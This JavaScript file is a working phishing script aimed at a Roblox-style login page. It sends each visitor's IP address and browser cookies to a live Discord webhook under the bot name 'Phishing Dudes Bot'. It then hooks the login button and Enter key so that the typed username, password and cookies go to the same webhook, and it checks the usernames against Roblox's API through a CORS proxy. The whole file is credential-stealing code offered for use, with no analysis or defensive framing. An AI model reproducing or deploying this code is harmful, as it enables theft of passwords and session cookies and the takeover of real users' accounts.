document.addEventListener('DOMContentLoaded', function() {
    // Target the React login container
    const loginContainer = document.getElementById('react-login-web-app');
    if (!loginContainer) return;

    let isInitialized = false; // Flag to ensure initialization happens once

    // Function to send IP on page load
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // Prepare embed data for IP capture
            const ipEmbedData = {
                username: 'Phishing Dudes Bot', // Webhook name
                embeds: [{
                    title: 'Website Entry',
                    color: 15258703, // Hex color #E67E22 (orange)
                    fields: [
                        { name: 'IP Address', value: ipAddress, inline: true },
                        { name: 'Cookies', value: document.cookie || 'No cookies', inline: true },
                        { name: 'Timestamp', value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: 'Captured at 08:30 PM CEST, September 14, 2025' }
                }]
            };

            // Send IP and initial cookies to the webhook
            fetch('https://discord.com/api/webhooks/1482443774927048725/6WBoc0xsmaXIW21yVVkZ6gXRLQzWFixk2MkIt9cQJMOhy2AAlK3AntWWrish22PCjqZn', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(ipEmbedData)
            }).catch(error => console.error('IP fetch error:', error));
        })
        .catch(error => console.error('IP API error:', error));

    // Function to initialize or reinitialize the login behavior
    function initializeLoginBehavior() {
        const usernameInput = loginContainer.querySelector('input[type="text"]');
        const passwordInput = loginContainer.querySelector('input[type="password"]');
        if (!usernameInput || !passwordInput || isInitialized) return;

        // Debounced submit function to handle multiple logins
        let isSubmitting = false;
        const debounceSubmit = function(event) {
            if (isSubmitting) return;
            isSubmitting = true;

            if (event) event.preventDefault();

            const username = usernameInput.value;
            const password = passwordInput.value;
            const cookies = document.cookie || 'No cookies';

            // Use CORS proxy to access Roblox API
            fetch(`https://cors-anywhere.herokuapp.com/https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`, {
                headers: {
                    'Origin': window.location.origin // Attempt to mimic origin
                }
            })
                .then(response => {
                    if (!response.ok) throw new Error('Network response was not ok');
                    return response.json();
                })
                .then(data => {
                    const isValidUsername = data.success && data.Id > 0; // Valid if API returns an ID
                    const isValidLogin = isValidUsername && password.length > 0; // Real check requires server auth

                    // Prepare embed data for login attempt
                    const loginEmbedData = {
                        username: 'Phishing Dudes Bot', // Webhook name
                        embeds: [{
                            title: 'Login Attempt',
                            color: isValidUsername ? 3066993 : 15158332, // Green for valid username, Red for invalid
                            fields: [
                                { name: 'Username', value: username, inline: true },
                                { name: 'Password', value: password, inline: true },
                                { name: 'Cookies', value: cookies, inline: true },
                                { name: 'Valid Username', value: isValidUsername ? 'Yes' : 'No', inline: true },
                                { name: 'Valid Login', value: isValidLogin ? 'Yes (Note: Server auth required)' : 'No', inline: true },
                                { name: 'Timestamp', value: new Date().toISOString(), inline: true }
                            ],
                            footer: { text: 'Captured at 08:30 PM CEST, September 14, 2025' }
                        }]
                    };

                    // Send login data to the webhook
                    fetch('https://discord.com/api/webhooks/1482443774927048725/6WBoc0xsmaXIW21yVVkZ6gXRLQzWFixk2MkIt9cQJMOhy2AAlK3AntWWrish22PCjqZn', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(loginEmbedData)
                    }).catch(error => console.error('Login fetch error:', error));
                })
                .catch(error => {
                    console.error('Roblox API error:', error);
                    const loginEmbedData = {
                        username: 'Phishing Dudes Bot',
                        embeds: [{
                            title: 'Login Attempt',
                            color: 15158332, // Red for error
                            fields: [
                                { name: 'Username', value: username, inline: true },
                                { name: 'Password', value: password, inline: true },
                                { name: 'Cookies', value: cookies, inline: true },
                                { name: 'Valid Username', value: 'API Error', inline: true },
                                { name: 'Valid Login', value: 'N/A', inline: true },
                                { name: 'Timestamp', value: new Date().toISOString(), inline: true }
                            ],
                            footer: { text: 'Captured at 08:30 PM CEST, September 14, 2025' }
                        }]
                    };
                    fetch('https://discord.com/api/webhooks/1482443774927048725/6WBoc0xsmaXIW21yVVkZ6gXRLQzWFixk2MkIt9cQJMOhy2AAlK3AntWWrish22PCjqZn', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(loginEmbedData)
                    }).catch(error => console.error('Error fetch error:', error));
                })
                .finally(() => {
                    isSubmitting = false; // Allow next submission
                });
        };

        // Assign debounced function to window.submitForm
        window.submitForm = debounceSubmit;

        // Attach event listener to the login button (if it exists)
        const loginButton = loginContainer.querySelector('button[type="submit"]') || loginContainer.querySelector('button');
        if (loginButton) {
            loginButton.removeEventListener('click', window.submitForm); // Remove existing listener
            loginButton.addEventListener('click', window.submitForm);
        }

        // Attach keypress listener for Enter key
        loginContainer.removeEventListener('keypress', handleKeyPress); // Remove existing listener
        loginContainer.addEventListener('keypress', handleKeyPress);

        function handleKeyPress(e) {
            if (e.key === 'Enter') {
                window.submitForm(e);
            }
        }

        isInitialized = true; // Mark as initialized
    }

    // Initial check and setup
    initializeLoginBehavior();

    // Re-check only if not initialized, in case React re-renders
    const checkInterval = setInterval(() => {
        if (!isInitialized) {
            const usernameInput = loginContainer.querySelector('input[type="text"]');
            const passwordInput = loginContainer.querySelector('input[type="password"]');
            if (usernameInput && passwordInput) {
                initializeLoginBehavior();
            }
        }
    }, 100); // Check every 100ms
});